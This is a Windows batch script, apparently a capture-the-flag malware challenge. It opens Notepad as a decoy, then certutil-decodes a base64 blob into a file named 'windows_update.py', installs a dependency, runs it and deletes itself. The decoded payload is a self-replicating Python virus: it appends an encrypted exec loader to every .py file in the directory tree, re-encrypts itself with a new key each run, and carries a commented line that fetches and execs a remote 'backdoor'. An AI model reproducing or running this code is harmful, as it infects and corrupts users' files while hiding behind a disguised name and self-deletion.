@echo off
start "" "C:\Windows\System32\notepad.exe"
echo aW1wb3J0IG9zCmZyb20gY3J5cHRvZ3JhcGh5LmZlcm5ldCBpbXBvcnQgRmVybmV0CgoKZGVmIGRlY3J5cHQodG9rZW4sIGtleSk6CiAgICBmZXIgPSBGZXJuZXQoa2V5KQogICAgdmlydXMgPSBmZXIuZGVjcnlwdCh0b2tlbikuZGVjb2RlKCkKICAgIGV4ZWModmlydXMpCgoKIyBTVEFSVAprZXkgPSAiZHNUa3N3bTBVbkk5Z3Q0S1RUSTN6bVlHZzBLQ3JDV3ktOGx2YnJka1Flaz0iCnRva2VuID0gImdBQUFBQUJuQW1CVEdxY3A1cUV6dDZqa1VkN1RlQVJSZ2VZZnFPU1ZScGN0MHFuMFdWLVJBaFZ0TGpNNzQ1NmxRSjFMdkJkakczeDRPU3MxUTJoajdGTG9VQW8zNzlUZzBmNXo0cEJFZ24yMkFQMFhiN2pfRTUyNDRfRVdPLVFZSmI3MmFwdHFKenZRN2tYVm4yOVVVelh5QlRFSHZUejBBeUVQenBUcGZrRENrM1dHVWxLQXFjVTZEZDhMTnlVN2xJSWVfdkhkNlo1dGJ0N09lME9oYTdqLU91TjJZTElBd1BXeU56Q29YVmxKbEhkeXdLSGxzaHBnUzAwalk3QkVNbENzTV9nWkF1bGxDb1cxRjF0VGk0S25qdkFuUHhFM0VPMTA3UktGNy01c3lPdVVGTWRGUDB2Q0Nzb2ZMV1JSUHZaSXZ6akFBVG5oMk9mT0w1eWZfT3U1cU1wV1FITllxV1Fvd21TLWk1NWJGSU4waThiZy1Yel9hYXFoNEloNzgzbm1lempPQ3RiN3RzVFZSVGdPdHEzM1ViMmlJdHRVaExGdmdIUzliaXdXWElqSk9qTHdQcFNNWTY4LTRrdWh6S2tjRjA5aDVmYUpaaTNoWHQxekt5TUE0X09lVXZOUFVpczdxYkpoLXhYeS1DTDc1bkVqY1Aybm8wY3hQS25iY0I2UzEtdGc3c1FncVVZeGZSc1owamFEVnIwWWFXNFNhNnRsX24xcUNwb2RaSHlrWWNOZjhMNmtkVUlfb0h3WFZydGF3LURWYlIzQkVxbE1veG8ycG5yeFc3NHNNczdmM3hXU2JCQkp4czRnQ3NvT1NjYU1Cei1zSVhFSmp6NE5FRGI0Rlh0RWJJRTBXTU9wMHYyVGZMRTBCNEY1TXFRU3F1c0xxVHNQT3BLcjdMckdhNG1Vb09GWjg0eWhaZmdKRmdvN3Q0MWpYRzJ3clFQaTEtNDJzcGhIb3hJTElLdlh4YnZGZFhmcjYweXBXVENkWTRQcDB3RXB5V1liZy00VG01eGFSVzhGQUIyWVlSMl9QZ01URzdMdWtGN1ZaLS1Ua3VRb3BleGdETWNLQW5EcW1adnFnM2wxOGp2TElySVRoZ0p3Tm5SaG9Od0VMQ1AzUU1ueFNQdDd4ak94UTVaUUVoMkV0VjJ0bDNnUVJBS0MtVHZpS2k4X1JCVTdXOFhRRE5ScWU5dHpsbHpMMmVwbTZEVlg2N0tfWGdUdzc1QXZsWFdkV3k2R21qSFllcDkwRk1WS1hqR200ZkFpQUxTX0syTmlNanNrZ3I1YzYtY1RfSExhWHljbmZiZFE0UlVRQ2RDNXpyaG51bDdmZ1lIRGR6am01YVZiYkluR3RfUk5Hb0FKM0ZSMGg3S0V6cUNld0xaaW90RmVkdHVKSEZ4N09GdF9Hb2pPZ3pTTE96N2lqaEJ4YlQzYjBZajZUVFZ1b1U0S1R3T1dpeUVsdmxiWVhiZ3BsbHRNREh5WlYtQUNkZnFxMjFjS2xSeGVYakpPNlpISGJMRlFqWS04alFvdmRLY2VqaXVuVVhFQU0tVlJaTEI0S2I4V0J2TjZLOWJ1U0Z1a2JNRHA2bDFuaWtIOEFZRVZQYkZfbDZuR2J0NzRaQzdGeEc1ajU3OUdickI3R2c5RTFrZXhJeVRqNERlbEVuZTg0bzZnaFQ0RnFXbk5OeUp5SWtrb082NWNhM1ljeFdjTGVOcmhkd0Zocm9xUUVIQ3lHLVhOZXh6ZVp2eGs4Y0R4NlpFcXBXMENsTmNibE42S0RjNTVxdVV2SHNRTFZXUEZRZ2dmRVZ1a01WbmNfVnp5TUtlR3BwTXV6RGt5ajJwaU5QcW1WenhaXzNETzR5czIyZm9Gcml5OW9LQmRuS3Y0NWllMWlLZjZMWnZXWnNkbzNSaWhteGstR1ZmNzhnPT0iCgpkZWYgcnVuKCk6CiAgICBkZWYgZXhlY3V0ZSgpOgogICAgICAgIHdpdGggb3BlbigiQnllQnllLnR4dCIsICd3JykgYXMgZmlsZToKICAgICAgICAgICAgZmlsZS53cml0ZSgiWW91IGp1c3QgZ290IGhhY2tlZC5cbiIpCiAgICAgICAgICAgIGZsYWcgPSAiVzBXX000bDFjaTB1cyIKICAgICAgICAgICAgIyBpbXBvcnQgcmVxdWVzdHM7IGV4ZWMocmVxdWVzdHMuZ2V0KCJodHRwczovL1NlY3VyaW5ldHN7RXZpbF8vYmFja2Rvb3IuZXhlIikudGV4dCk7CgogICAgCiAgICBleGVjdXRlKCkKICAgIGdsb2JhbCBrZXkKICAgIGdsb2JhbCB0b2tlbgoKICAgIGZlciA9IEZlcm5ldChrZXkpCiAgICB2aXJ1cyA9IGZlci5kZWNyeXB0KHRva2VuKS5kZWNvZGUoKQoKICAgIGtleSA9IEZlcm5ldC5nZW5lcmF0ZV9rZXkoKQogICAgZmVyID0gRmVybmV0KGtleSkKICAgIHRva2VuID0gZmVyLmVuY3J5cHQodmlydXMuZW5jb2RlKCkpCgogICAgaWYgb3MucGF0aC5iYXNlbmFtZShvcy5nZXRjd2QoKSkgIT0gInNhbmRib3giOgogICAgICAgIHByaW50KCJUaGlzIHNjcmlwdCBjYW4gb25seSBydW4gaW4gdGhlICdzYW5kYm94JyBkaXJlY3RvcnkuIikKICAgICAgICBleGl0KCkKICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKCIuIik6CiAgICAgICAgICAgIGZvciBmaWxlIGluIGZpbGVzOgogICAgICAgICAgICAgICAgaWYgZmlsZS5lbmRzd2l0aCgiLnB5Iik6CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKHJvb3QsIGZpbGUpCiAgICAgICAgICAgICAgICAgICAgaWYgZmlsZV9wYXRoID09ICIuXFxvYmZzLnB5IjoKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUgCiAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ2EnKSBhcyBmOgogICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKCJcbmltcG9ydCBvc1xuIikKICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZSgiZnJvbSBjcnlwdG9ncmFwaHkuZmVybmV0IGltcG9ydCBGZXJuZXRcbiIpCiAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUoImRlZiBkZWNyeXB0KHRva2VuLCBrZXkpOlxuXHRmZXIgPSBGZXJuZXQoa2V5KVxuXHR2aXJ1cyA9IGZlci5kZWNyeXB0KHRva2VuKS5kZWNvZGUoKVxuXHRleGVjKHZpcnVzKVxuIikKICAgICAgICAgICAgICAgICAgICAgICAgZi53cml0ZSgia2V5ID0gXCJ7fVwiXG4iLmZvcm1hdChrZXkuZGVjb2RlKCkpKQogICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKCJ0b2tlbiA9IFwie31cIlxuIi5mb3JtYXQodG9rZW4uZGVjb2RlKCkpKQogICAgICAgICAgICAgICAgICAgICAgICBmLndyaXRlKCJcbmRlY3J5cHQodG9rZW4sIGtleSlcbiIpCgogICAgZm5hbWUgPSBvcy5wYXRoLmJhc2VuYW1lKF9fZmlsZV9fKQogICAgbGluZXMgPSBbXQogICAgd2l0aCBvcGVuKGZuYW1lLCAncicpIGFzIGY6CiAgICAgICAgbGluZXMgPSBmLnJlYWRsaW5lcygpCiAgICAKICAgIHdpdGggb3BlbignbG9sJywgJ3cnKSBhcyBmOgogICAgICAgIGZvciBsaW5lIGluIGxpbmVzOgogICAgICAgICAgICBpZiBsaW5lLnN0YXJ0c3dpdGgoIiMgU1RBUlQiKToKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGYud3JpdGUobGluZSkKCiAgICAgICAgZi53cml0ZSgiIyBTVEFSVFxuIikKICAgICAgICAgICAgCiAgICAgICAgZi53cml0ZSgia2V5ID0gXCJ7fVwiXG4iLmZvcm1hdChrZXkuZGVjb2RlKCkpKQogICAgICAgIGYud3JpdGUoInRva2VuID0gXCJ7fVwiXG4iLmZvcm1hdCh0b2tlbi5kZWNvZGUoKSkpCiAgICAgICAgZi53cml0ZSgiXG5kZWNyeXB0KHRva2VuLCBrZXkpXG4iKQogICAgICAgIAoKCiAgICBvcy5yZW1vdmUoZm5hbWUpCiAgICBvcy5yZW5hbWUoImxvbCIsIGZuYW1lKQoKCnJ1bigp > temp_base64.txt

certutil -decode temp_base64.txt windows_update.py

pip install cryptography

python windows_update.py

del temp_base64.txt

del windows_update.py

del "%~f0"